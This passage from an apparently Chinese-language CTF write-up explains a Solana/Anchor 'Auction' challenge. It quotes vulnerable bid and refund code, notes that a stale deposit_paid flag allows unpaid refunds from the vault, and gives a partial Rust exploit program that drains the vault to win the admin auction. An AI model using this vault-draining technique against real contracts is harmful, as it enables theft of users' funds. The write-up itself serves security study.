        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Failed. Status: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




<hr>
<h1 id="Misc-Auction"><a href="#Misc-Auction" class="headerlink" title="Misc - Auction"></a>Misc - Auction</h1><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> auction_state<span class="token punctuation">.</span>ended <span class="token operator">==</span> <span class="token boolean">true</span>
    <span class="token operator">&amp;&amp;</span> auction_state<span class="token punctuation">.</span>settled <span class="token operator">==</span> <span class="token boolean">true</span>
    <span class="token operator">&amp;&amp;</span> auction_state<span class="token punctuation">.</span>highest_bidder <span class="token operator">==</span> player<span class="token punctuation">.</span><span class="token function">pubkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token macro property">writeln!</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> <span class="token string">"Auction ended! Here is your flag:"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token namespace">env<span class="token punctuation">::</span></span><span class="token function">var</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">writeln!</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> <span class="token string">"flag: &#123;:?&#125;"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">writeln!</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> <span class="token string">"flag not found, please contact admin"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>服务端启动 Solana&#x2F;Anchor 程序并初始化一场管理员拍卖（buy-now&#x3D;10 SOL），随后加载选手的 solve 指令执行。flag 条件只有当管理员拍卖状态满足：</p>
<ul>
<li>ended &#x3D;&#x3D; true</li>
<li>settled &#x3D;&#x3D; true</li>
<li>highest_bidder &#x3D;&#x3D; player</li>
</ul>
<p>选手资金初始不足以直接 10 SOL 结算，需要从系统或 vault 中弄钱</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Place or raise a bid. Only a single deposit is locked up front.</span>
<span class="token comment">/// If buy-now is reached, the auction ends immediately and an event is emitted.</span>
<span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">place_bid</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">PlaceBid</span><span class="token operator">></span><span class="token punctuation">,</span> bid_amount<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span>bid_amount <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">InvalidBidAmount</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> auction <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>auction<span class="token punctuation">;</span>

    <span class="token keyword">let</span> now <span class="token operator">=</span> <span class="token class-name">Clock</span><span class="token punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span>unix_timestamp<span class="token punctuation">;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span>
        <span class="token operator">!</span>auction<span class="token punctuation">.</span>ended <span class="token operator">&amp;&amp;</span> now <span class="token operator">&lt;</span> auction<span class="token punctuation">.</span>end_time<span class="token punctuation">,</span>
        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">AuctionAlreadyEnded</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span>bid_amount <span class="token operator">>=</span> auction<span class="token punctuation">.</span>starting_bid<span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">BidTooLow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> auction<span class="token punctuation">.</span>highest_bid <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">require!</span><span class="token punctuation">(</span>
            bid_amount <span class="token operator">>=</span> auction<span class="token punctuation">.</span>highest_bid<span class="token punctuation">.</span><span class="token function">saturating_add</span><span class="token punctuation">(</span>auction<span class="token punctuation">.</span>increment<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">IncrementTooSmall</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// Pay deposit if required and not already paid.</span>
    <span class="token keyword">let</span> bidder_state <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder_state<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token operator">!</span>bidder_state<span class="token punctuation">.</span>deposit_paid <span class="token punctuation">&#123;</span>
        <span class="token function">system_transfer</span><span class="token punctuation">(</span>
            <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
                ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token namespace">anchor_lang<span class="token punctuation">::</span>system_program<span class="token punctuation">::</span></span><span class="token class-name">Transfer</span> <span class="token punctuation">&#123;</span>
                    from<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    to<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            auction<span class="token punctuation">.</span>deposit_amount<span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        bidder_state<span class="token punctuation">.</span>deposit_paid <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        auction<span class="token punctuation">.</span>deposit_count <span class="token operator">=</span> auction
            <span class="token punctuation">.</span>deposit_count
            <span class="token punctuation">.</span><span class="token function">checked_add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">ok_or</span><span class="token punctuation">(</span><span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">MathOverflow</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    bidder_state<span class="token punctuation">.</span>bidder <span class="token operator">=</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bidder_state<span class="token punctuation">.</span>auction <span class="token operator">=</span> auction<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bidder_state<span class="token punctuation">.</span>refunded <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    bidder_state<span class="token punctuation">.</span>bump <span class="token operator">=</span> ctx<span class="token punctuation">.</span>bumps<span class="token punctuation">.</span>bidder_state<span class="token punctuation">;</span>

    <span class="token comment">// Update auction high bid.</span>
    auction<span class="token punctuation">.</span>highest_bid <span class="token operator">=</span> bid_amount<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>auction<span class="token punctuation">.</span>buy_now_price<span class="token punctuation">)</span><span class="token punctuation">;</span>
    auction<span class="token punctuation">.</span>highest_bidder <span class="token operator">=</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// If buy-now reached, end immediately.</span>
    <span class="token keyword">if</span> bid_amount <span class="token operator">>=</span> auction<span class="token punctuation">.</span>buy_now_price <span class="token punctuation">&#123;</span>
        auction<span class="token punctuation">.</span>ended <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/// Losers reclaim their deposit (if any) after the auction ends.</span>
<span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">claim_refund</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">ClaimRefund</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> auction <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>auction<span class="token punctuation">;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span>auction<span class="token punctuation">.</span>ended<span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">AuctionNotEnded</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span>
        auction<span class="token punctuation">.</span>highest_bidder <span class="token operator">!=</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">WinnerMustClaimViaWinnerPath</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> bidder_state <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder_state<span class="token punctuation">;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span><span class="token operator">!</span>bidder_state<span class="token punctuation">.</span>refunded<span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">AlreadyRefunded</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span>
        auction<span class="token punctuation">.</span>deposit_amount <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> bidder_state<span class="token punctuation">.</span>deposit_paid<span class="token punctuation">,</span>
        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">DepositNotPaid</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span>
        bidder_state<span class="token punctuation">.</span>bidder <span class="token operator">==</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">UnauthorizedBidderState</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">require!</span><span class="token punctuation">(</span>
        bidder_state<span class="token punctuation">.</span>auction <span class="token operator">==</span> auction<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">ErrorCode</span><span class="token punctuation">::</span><span class="token class-name">WrongAuction</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">transfer_from_vault</span><span class="token punctuation">(</span>
        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">,</span>
        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>bidder<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        auction<span class="token punctuation">.</span>deposit_amount<span class="token punctuation">,</span>
        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">,</span>
        ctx<span class="token punctuation">.</span>bumps<span class="token punctuation">.</span>vault<span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    auction<span class="token punctuation">.</span>deposit_count <span class="token operator">=</span> auction<span class="token punctuation">.</span>deposit_count<span class="token punctuation">.</span><span class="token function">saturating_sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bidder_state<span class="token punctuation">.</span>refunded <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只要 <code>bidder_state.deposit_paid == false</code>，就会从 bidder 向 vault 转押金<br>押金成功后仅修改 <code>deposit_paid = true</code>，并累加 <code>auction.deposit_count</code><br>但在新拍卖中，同一 <code>bidder_state</code> 只要没被重建，就不会被重置</p>
<p><code>claim_refund</code> 只校验：<code>auction.ended == true</code>，<code>bidder_state.deposit_paid == true</code>，<code>bidder_state.refunded == false</code>，<code>bidder_state</code> 与 <code>auction/bidder</code> 匹配</p>
<p>但没有校验该拍卖是否真的收过押金，也没有验证 deposit_count 是否对应实际转入</p>
<p>一旦 deposit_paid 在某次拍卖里被置为 true，后续新拍卖里同一 bidder_state 可跳过押金支付，但 claim_refund 仍允许从 vault 取回押金。</p>
<p>思路：</p>
<p>创建一个极小金额拍卖，分别让 player 和 exploit_pda 参与竞拍，使其 deposit_paid &#x3D; true。<br>之后关闭拍卖，释放拍卖账户，但 bidder_state 保留</p>
<p>然后从 vault 抽 SOL，足够了之后直接结算管理员拍卖</p>
<p>lib.rs，用于生成 exploit.so</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">anchor_lang<span class="token punctuation">::</span>prelude<span class="token punctuation">::</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span>accounts<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span>
    <span class="token class-name">ClaimRefund</span><span class="token punctuation">,</span> <span class="token class-name">ClaimWinner</span><span class="token punctuation">,</span> <span class="token class-name">CloseAuction</span><span class="token punctuation">,</span> <span class="token class-name">CreateAuction</span><span class="token punctuation">,</span> <span class="token class-name">PlaceBid</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">challenge<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token keyword">self</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token macro property">declare_id!</span><span class="token punctuation">(</span><span class="token string">"22222222222222222222222222222222222222222522"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token attribute attr-name">#[program]</span>
<span class="token keyword">pub</span> <span class="token keyword">mod</span> <span class="token module-declaration namespace">exploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token operator">*</span><span class="token punctuation">;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">solve</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> bump <span class="token operator">=</span> ctx<span class="token punctuation">.</span>bumps<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">;</span>
        <span class="token function">ensure_exploit_pda_funded</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctx<span class="token punctuation">,</span> bump<span class="token punctuation">,</span> <span class="token number">5_000_000</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        <span class="token function">seed_deposit_flags</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctx<span class="token punctuation">,</span> bump<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        <span class="token function">drain_vault</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctx<span class="token punctuation">,</span> bump<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token operator">*</span> <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">,</span> <span class="token number">51</span> <span class="token operator">*</span> <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        <span class="token function">win_admin_auction</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">:</span> <span class="token keyword">u64</span> <span class="token operator">=</span> <span class="token number">1_000_000_000</span><span class="token punctuation">;</span>

<span class="token attribute attr-name">#[inline(never)]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">ensure_exploit_pda_funded</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">,</span> bump<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">,</span> lamports<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">lamports</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> seeds <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span>bump<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> signer <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>seeds<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> ix <span class="token operator">=</span> <span class="token namespace">anchor_lang<span class="token punctuation">::</span>solana_program<span class="token punctuation">::</span>system_instruction<span class="token punctuation">::</span></span><span class="token function">create_account</span><span class="token punctuation">(</span>
        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        lamports<span class="token punctuation">,</span>
        <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token operator">&amp;</span>ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">anchor_lang<span class="token punctuation">::</span>solana_program<span class="token punctuation">::</span>program<span class="token punctuation">::</span></span><span class="token function">invoke_signed</span><span class="token punctuation">(</span>
        <span class="token operator">&amp;</span>ix<span class="token punctuation">,</span>
        <span class="token operator">&amp;</span><span class="token punctuation">[</span>
            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span>
        signer<span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[inline(never)]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">seed_deposit_flags</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">,</span> bump<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">(</span>end_time<span class="token punctuation">,</span> settlement_deadline<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">auction_times</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> exploit_seeds <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span>bump<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> signer <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>exploit_seeds<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Tiny auction to set deposit_paid=true for both bidder states.</span>
    <span class="token keyword">let</span> cpi_create <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">CreateAuction</span> <span class="token punctuation">&#123;</span>
            auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">create_auction</span><span class="token punctuation">(</span>
        cpi_create<span class="token punctuation">,</span>
        <span class="token number">999</span><span class="token punctuation">,</span>
        <span class="token string">"seed"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token number">2</span><span class="token punctuation">,</span>
        <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token number">1</span><span class="token punctuation">,</span>
        end_time<span class="token punctuation">,</span>
        settlement_deadline<span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> cpi_bid_player <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>
            bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
